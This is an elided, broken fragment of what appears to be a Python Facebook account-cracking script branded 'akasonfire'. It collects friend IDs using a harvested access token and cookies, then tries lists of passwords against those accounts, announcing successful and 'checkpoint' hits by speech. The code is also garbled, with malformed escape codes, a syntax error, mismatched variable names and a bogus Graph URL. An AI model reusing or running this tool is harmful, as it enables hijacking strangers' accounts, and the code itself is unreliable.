...
def uaku():
	try:
		...
		a=requests.get('https://github.com/akasonfire').text
		ua=open('.bbnew.txt','w')
...
def login():
	...
	if AKASH in ['m']:
		...
		os.system('xdg-open https://www.facebook.com/akasonfire1')
	elif AKAS in ['0']:
...
def public():
	...
	for userr in uid:
		try:
			col = ses.get('https://www.facebook.com/akasonfire1/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
...
def crack_file():
	...
	o = input('\x1b[1;97m [+] INPut FILE NAME : AKASH')
	print('')
...
def setting():
	...
	os.system('espeak -a 300 " 1,  method,  i love you akash"')
	hc = input(' CHOOSE: W9')
	if hc in ['1','01']:
...
def passwrd():
	os.system('clear')
	banner()
	print('\1033[97;1m[\1033[92;1m+\1033[97;1m] \1033[0;92mTOTAL IDz :\1033[0;97m '+str(len(id)))
	...
	print(f'{h}[{h}💚{h}]{h} Your Total OK idz :1000000 {h}%s '%(ok))
	input('CLICK ENTER TO EXIT 'Akas)
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				os.system('espeak -a 300 " C,  P '' O,  K"')
				...
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " AKASH VAI FREE FIRE,  Ok,  id"')
